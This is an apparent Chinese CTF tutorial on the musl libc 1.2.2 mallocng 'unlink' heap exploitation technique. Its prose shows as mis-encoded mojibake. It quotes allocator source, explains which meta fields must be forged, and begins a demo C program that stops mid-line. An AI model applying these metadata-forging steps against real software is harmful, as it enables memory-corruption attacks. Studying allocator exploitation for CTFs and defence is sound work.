<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¦æ±‚<code>mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)</code>ï¼Œå› æ­¤è¦åˆç†è®¾ç½®<code>meta</code>çš„ä¸¤ä¸ª<code>mask</code>çš„å€¼ã€‚</p>
<p>ä¹‹åè°ƒç”¨äº†<code>free_group</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">		<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">		g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">		mi = nontrivial_free(m, idx);</span><br><span class="line">	&#125;</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬ä¸èƒ½åœ¨if-elseè¯­å¥ä¸­è·³è½¬åˆ°elseåˆ†æ”¯ï¼Œé‚£æ ·ä¼šå†ä¸€æ¬¡è°ƒç”¨<code>nontrivial_free</code>ï¼Œå› æ­¤è¦ä¿è¯<code>meta</code>çš„<code>maplen</code>å­—æ®µä¸ä¸º0ã€‚</p>
<p>è¿™äº›æ£€æŸ¥ä¸æ¡ä»¶åˆ¤æ–­é€šè¿‡åï¼Œå°±å¯ä»¥æˆåŠŸé‡Šæ”¾å‡chunkäº†ã€‚</p>
<p>ä¸‹é¢å°±æ˜¯musl libc unlinkæ¼æ´çš„demoç¨‹åºï¼Œå¦‚æœ‰ä»»ä½•éé¢„æœŸæƒ…å†µè¯·ä¸ç¬”è€…è”ç³»ï¼Œä¸èƒœæ„Ÿæ¿€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_1[<span class="number">0x8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_2[<span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> group* <span class="title function_">get_group</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)(chunk - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk[<span class="number">-4</span>])</span><br><span class="line">        offset = *(<span class="type">unsigned</span> <span class="type">int</span> *)(chunk - <span class="number">8</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> (<span class="type">void</span> *)(chunk - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> group_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta* <span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> get_group(chunk);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">meta_addr</span> =</span> group_addr-&gt;meta;</span><br><span class="line">    <span class="keyword">return</span> meta_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta_area* <span class="title function_">get_meta_area</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* meta)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta_area*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ¬ç¨‹åºç”¨äºæ¼”ç¤ºmusl libcä¸­çš„unlinkæ“ä½œã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æµ‹è¯•ç¯å¢ƒï¼šubuntu 22.04ï¼Œmusl libcç‰ˆæœ¬ï¼š1.2.2ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;é‰´äºmusl libcçš„è½»é‡æ€§ï¼Œä¸å…¶ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ä¹Ÿè¾ƒä¸ºå•ä¸€ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æœ¬ç¨‹åºæ‰€æ¼”ç¤ºçš„unlinkæ˜¯æœ€ä¸ºå¸¸ç”¨çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;musl libcä¸glibcä¸åŒï¼Œåœ¨ä¸»ç¨‹åºçš„mainå‡½æ•°å¼€å§‹æ‰§è¡Œæ—¶ï¼Œå†…å­˜åˆ†é…å™¨å°±å·²ç»å®Œæˆäº†åˆå§‹åŒ–ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;è¯·æ³¨æ„ï¼šåœ¨ä¸€ä¸ªgroupä¸­åˆ†é…å‡ºæ¥çš„chunkå¾ˆå¯èƒ½åœ¨åœ°å€ç©ºé—´ä¸Šä¸ç›¸é‚»ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å› ä¸ºä¸€ä¸ªgroupéœ€è¦ç¡®ä¿æ¯ä¸ªchunkéƒ½èƒ½å¤Ÿå®¹çº³è¯¥èŒƒå›´å†…æœ€å¤§çš„chunkã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å› æ­¤ï¼Œè°ƒè¯•ä¾¿æ˜¯musl libcèµ›é¢˜çš„é‡ä¸­ä¹‹é‡ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä¸‹é¢æ˜¯åˆšåˆšè¿›å…¥mainå‡½æ•°æ—¶å †çš„æƒ…å†µï¼š\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;pwndbg&gt; mheap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;          secret : 0xd8e803bc461ae35a\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    mmap_counter : 0x0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      avail_meta : 0x55555555a0e0 (count: 96)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       free_meta : 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot; avail_meta_area : 0x55555555b000 (count: 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_head : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_tail : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       active[7] : 0x55555555a090 (mem: 0x555555558f40) -&gt; 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;å¯è§å·²ç»æœ‰ä¸€äº›metaè¢«é“¾å…¥åˆ°é“¾è¡¨æ•°ç»„ä¹‹ä¸­äº†ã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;ä½†è¿™å¯¹åšé¢˜çš„å½±å“å¹¶ä¸å¤§ï¼Œé€šè¿‡å¤šæ¬¡è°ƒè¯•ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè®©è‡ªå·±çš„chunkè¿›å…¥æƒ³è¦çš„metaã€‚\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;æ¥ä¸‹æ¥è®©æˆ‘ä»¬å°è¯•åˆ†é…å‡ ä¸ªchunkã€‚\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span 